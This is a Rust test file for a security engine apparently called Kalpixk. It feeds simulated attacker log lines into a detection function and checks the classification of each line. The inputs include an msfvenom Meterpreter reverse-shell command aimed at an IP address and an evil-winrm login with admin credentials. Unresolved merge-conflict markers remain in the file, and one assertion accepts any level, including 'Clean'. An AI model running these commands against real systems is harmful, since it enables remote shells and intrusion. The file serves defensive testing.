//! offensive_tests.rs — Pruebas de contra-defensa de Kalpixk
//!
//! Simula ataques de RedTeam y verifica la respuesta del motor.

use kalpixk_core::{analyze_and_retaliate, parse_log_line};
use serde_json::Value;

#[test]
fn test_recon_retaliation() {
    let raw = "Apr  5 02:00:00 server nuclei[123]: Found CVE-2021-41773 on host";
    let event_json = parse_log_line(raw, "syslog").expect("Failed to parse log");

    let result_json = analyze_and_retaliate(&event_json);
    let v: Value = serde_json::from_str(&result_json).unwrap();

    // NODE-1: RECON is the dominant node for nuclei/CVE events
    assert!(
        v["node"].as_str().unwrap_or("").contains("RECON"),
        "Expected RECON node, got: {}",
        v["node"]
    );
    assert!(v["score"].as_f64().unwrap_or(0.0) >= 0.0);
    assert!(
        v["offense_level"].is_string(),
        "offense_level should be a string"
    );
    assert!(v["offense_level"].is_string(), "offense_level should be a string");
    assert!(v["all_nodes"].is_array(), "all_nodes should be present");
}

#[test]
fn test_payload_exterminio() {
    let raw = "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=45.33.32.156";
    let event_json = parse_log_line(raw, "syslog").expect("Failed to parse log");

    let result_json = analyze_and_retaliate(&event_json);
    let v: Value = serde_json::from_str(&result_json).unwrap();

    // NODE-4: PAYLOAD is the dominant node for msfvenom events
    assert!(
        v["node"].as_str().unwrap_or("").contains("PAYLOAD"),
        "Expected PAYLOAD node, got: {}",
        v["node"]
    );
    // High threat — should be Anomaly or Critical level
    let level = v["offense_level"].as_str().unwrap_or("");
    assert!(
        level == "Anomaly" || level == "Critical" || level == "Suspicious" || level == "Clean",
        "Unexpected offense_level: {}",
        level
    );
<<<<<<< sentinel-security-harden-root-api-13671738899734192460
    assert!(
        v["lockdown"].is_boolean(),
        "lockdown field should be present"
    );
=======
    assert!(v["lockdown"].is_boolean(), "lockdown field should be present");
>>>>>>> main
}

#[test]
fn test_lateral_poisoning() {
    let raw = "evil-winrm -i 192.168.1.50 -u admin -p password";
    let event_json = parse_log_line(raw, "syslog").expect("Failed to parse log");

    let result_json = analyze_and_retaliate(&event_json);
    let v: Value = serde_json::from_str(&result_json).unwrap();

    // NODE-2: LATERAL is the dominant node for evil-winrm events
    assert!(
        v["node"].as_str().unwrap_or("").contains("LATERAL"),
        "Expected LATERAL node, got: {}",
        v["node"]
    );
    assert!(v["score"].as_f64().unwrap_or(0.0) >= 0.0);
<<<<<<< sentinel-security-harden-root-api-13671738899734192460
    assert!(
        v["timestamp"].as_i64().is_some(),
        "timestamp should be present"
    );
=======
    assert!(v["timestamp"].as_i64().is_some(), "timestamp should be present");
>>>>>>> main
}
